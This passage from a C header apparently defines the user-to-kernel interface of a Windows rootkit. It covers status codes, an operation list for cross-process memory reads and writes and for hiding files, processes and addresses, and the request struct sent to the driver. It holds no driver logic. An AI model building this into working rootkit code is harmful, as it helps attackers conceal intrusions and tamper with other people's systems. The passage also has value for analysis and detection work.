	ROOTKSTATUS_PROCESSEPRC = 0XFF000013,
	ROOTKSTATUS_USERSPACE = 0XFF000014,
}ROOTKIT_STATUS, * PROOTKIT_STATUS;


// special request constants:
typedef enum _ROOTKIT_OPERATION {
	RKOP_WRITE = 0xB000006F,
	RKOP_READ = 0xB000007F,
	RKOP_MDLBASE = 0xB000008F,
	RKOP_SYSINFO = 0xB000009F,
	RKOP_PRCMALLOC = 0xB00000AF,
	RKOP_HIDEFILE = 0xB00000BF,
	RKOP_HIDEPROC = 0xB00000CF,
	RKOP_HIDEADDR = 0xB00000DF,

	RKOP_NOOPERATION = 0xB0000101,
	RKOP_TERMINATE = 0xB0000102,
}ROOTKIT_OPERATION, * PROOTKIT_OPERATION;


// unexpected error constants -
typedef enum _ROOTKIT_UNEXERR {
	successful = 0x7F7F0000,
	memalloc = 0x7F7F0001,
	relevantpid = 0x7F7F0002,
	receivedata = 0x7F7F0003,
	sendmessage = 0x7F7F0004,
	invalidargs = 0x7F7F0005,
}ROOTKIT_UNEXERR, * PROOTKIT_UNEXERR;


// special struct for sending data about specific system information request -
typedef struct _RKSYSTEM_INFORMATION_CLASS {
	SYSTEM_INFORMATION_CLASS InfoType;
	ULONG InfoSize;
	ROOTKIT_STATUS ReturnStatus;
	PVOID PoolBuffer;
} RKSYSTEM_INFORMATION_CLASS, * PRKSYSTEM_INFORMATION_CLASS;


// Struct for passing string data -
typedef struct _STRING_DATA {
	const char* String;
	SIZE_T StrLen;
} STRING_DATA, * PSTRING_DATA;


/*
============
MAIN STRUCT:
============
*/


typedef struct _ROOTKIT_MEMORY {  // Used for communicating with the KM driver
	NTSTATUS Status;  // gets filled by the driver when the operation ends
	ROOTKIT_STATUS StatusCode;  // explains what the status means and why it is what it is
	ROOTKIT_OPERATION Operation;  // what operation to do (by defines)
	PVOID Buffer;  // buffer address (used for example in inputs)
	PVOID Out;  // pointer in memory to the output of the memory function
	ULONG64 Size; // size of memory chunk
	ULONG64 MainPID; // process that works on the memory
	ULONG64 SemiPID;  // (if the operation requests for reading) what is the PID of the destination process?
	ULONG64 MedPID;  // If needed, provide medium process PID
	const char* MdlName;  // (if the operation requests for a module base) what is the name of the module?
	const char* DstMdlName;  // (if the operation requests for a module base) what is the name of the module?
	ROOTKIT_UNEXERR Unexpected;  // data about an unexpected error that happened during the operation, is not relevant to driver
	BOOL IsFlexible;  // specifies if operations can be flexible
	PVOID Reserved;  // used for extra parameters needed to function
}ROOTKIT_MEMORY;